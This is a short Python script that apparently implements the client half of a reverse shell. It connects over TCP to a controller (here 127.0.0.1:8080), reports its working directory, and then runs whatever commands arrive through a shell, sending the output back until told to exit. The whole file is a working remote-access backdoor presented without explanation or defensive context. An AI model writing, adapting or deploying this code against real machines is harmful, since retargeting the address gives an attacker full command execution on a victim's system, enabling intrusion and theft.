import os
import socket
import subprocess

class Client:
    def __init__(self):
        global client
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect(("127.0.0.1", 8080))  # 127.0.0.1 localhost

    def shell(self):
        currentDir = os.getcwd()  
        client.send(currentDir.encode())  
        
        while True:
            cmd = client.recv(1024).decode()  
            
            if cmd == "exit()":
                break

            elif cmd[:2] == "cd":
                try:
                    os.chdir(cmd[3:]) 
                    currentDir = os.getcwd()
                    client.send(currentDir.encode())  
                except FileNotFoundError as e:
                    client.send(str(e).encode())  
            
            else:
                process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output = process.stdout.read() + process.stderr.read()
                client.send(output)  


client_instance = Client()
client_instance.shell()

client.close()
